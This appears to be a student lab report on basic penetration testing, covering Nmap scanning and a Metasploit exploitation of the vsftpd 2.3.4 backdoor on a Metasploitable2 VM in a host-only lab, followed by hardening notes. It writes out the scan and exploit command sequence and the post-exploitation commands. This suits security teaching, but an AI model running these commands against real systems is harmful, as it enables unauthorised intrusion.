# Task-4: Exploitation & System Security

## Overview
This project demonstrates basic penetration testing and system security concepts using Kali Linux, Nmap, Metasploit, and Metasploitable2 in a controlled lab environment.

The objective of this task was to understand vulnerability scanning, exploitation techniques, and post-exploitation analysis.

---

# Tools Used
- Kali Linux
- Metasploitable2
- Nmap
- Metasploit Framework

---

# Lab Setup
- Attacker Machine: Kali Linux
- Target Machine: Metasploitable2
- Network Type: VirtualBox Host-Only Network

---

# 1. Reconnaissance & Scanning

Performed network scanning and service enumeration using Nmap.

## Commands Used

```bash
nmap 192.168.56.101
```

```bash
nmap -sV 192.168.56.101
```

```bash
nmap --script vuln 192.168.56.101
```

## Outcome
- Identified open ports and running services
- Detected vulnerable services
- Performed vulnerability assessment

---

# 2. Exploitation Using Metasploit

Used Metasploit Framework to test the VSFTPD backdoor vulnerability.

## Commands Used

```bash
msfconsole
```

```bash
search vsftpd
```

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

```bash
set RHOSTS 192.168.56.101
```

```bash
set LHOST 10.0.2.15
```

```bash
run
```

## Outcome
- Vulnerability exploitation attempted successfully
- Backdoor service spawned on target machine

---

# 3. Basic Post-Exploitation

Executed basic system information commands after exploitation.

## Commands Used

```bash
whoami
```

```bash
uname -a
```

```bash
pwd
```

## Outcome
- Gathered system information from target environment

---

# 4. System Security & Hardening

Discussed basic system hardening techniques:
- Disabling unnecessary services
- Using firewalls
- Monitoring suspicious activity
- Regular vulnerability assessments

---

# Learning Outcomes
- Understanding penetration testing workflow
- Network reconnaissance and vulnerability scanning
- Basic exploitation techniques using Metasploit
- Introduction to post-exploitation concepts
- Importance of system security and hardening

---

# Disclaimer
This project was performed in a controlled lab environment for educational purposes only.
